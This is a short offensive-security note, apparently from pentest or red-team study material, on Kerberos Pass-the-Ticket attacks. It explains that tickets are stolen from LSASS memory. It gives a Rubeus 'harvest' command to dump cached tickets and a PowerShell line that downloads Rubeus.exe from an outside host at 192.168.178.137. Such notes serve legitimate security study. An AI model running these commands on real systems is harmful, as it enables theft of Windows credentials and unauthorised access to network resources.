# Pass The Ticket (Ticket Dump)
Don't create tickets, steal them from cache! With Pass-the-Ticket attacks, a threat actor wonâ€™t be forging Kerberos tickets. Instead, they will steal valid tickets that have already been created and issued, and pass them from one system to another in order to access resources as a legitimate, privileged user. 

The TGT and STs are located in the LSASS (Local Security Authority Subsystem Service)

User privilege: get TGT and TSs from user on system
Admin privilege: get all TGTs and TGs from all users on system

Requirements:
* Access to a machine

`Rubeus.exe harvest /interval:30`


Invoke-WebRequest -Uri "192.168.178.137:8000/Rubeus.exe" -OutFile "C:\Users\Administrator\Desktop"

User can request owned tickets, admin can request all.
